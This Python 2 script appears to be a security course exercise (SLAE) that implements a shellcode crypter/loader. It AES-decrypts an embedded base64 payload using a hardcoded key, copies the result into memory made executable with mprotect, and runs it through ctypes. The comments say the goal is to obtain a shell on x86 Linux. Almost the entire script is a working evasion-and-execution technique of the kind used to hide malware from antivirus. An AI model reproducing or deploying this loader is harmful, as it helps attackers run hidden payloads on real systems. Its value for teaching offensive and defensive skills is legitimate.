#!/usr/bin/env python
#Decryption in Python Using AES 128 & Base64
#Acknowledgement # http://www.codekoala.com/posts/aes-encryption-python-using-pycrypto/
#Acknowledgement # https://en.wikipedia.org/wiki/Advanced_Encryption_Standard
#Acknowledgement # https://en.wikipedia.org/wiki/Block_size_(cryptography)
#Acknowledgement # http://hacktracking.blogspot.com/2015/05/execute-shellcode-in-python.html
#SLAE-1122

from Crypto.Cipher import AES
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import base64
import os

BLOCK_SIZE = 16
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
secret = 'securitytubeSLAE' #Use static key
cipher = AES.new(secret)

#Encrypted shellcode found from AESEncryption.py

encoded = '5CJtU2PsI+erEYEb0l/3xiQvT0P0eeArByo4NEbKDb3n8dvPUM9H04Q8FCEK06HT7VlgveJoGWQDjXszmOjUkP0OvPf0OrefgZ/eRqrryx95REGDTPhOzCbPEY0el9s4zIV4N0lvsnFNy/o/aCRGOg=='
decoded = DecodeAES(cipher, encoded)

#Print the Decrypted shellcode

print 'Decrypted shellcode(AES 128 & Base64):', decoded

#Execute shellcode in python for getting shell from x86 Linux 

libc = CDLL('libc.so.6')
shellcode = decoded.replace('\\x', '').decode('hex')
sc = c_char_p(shellcode)
size = len(shellcode)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
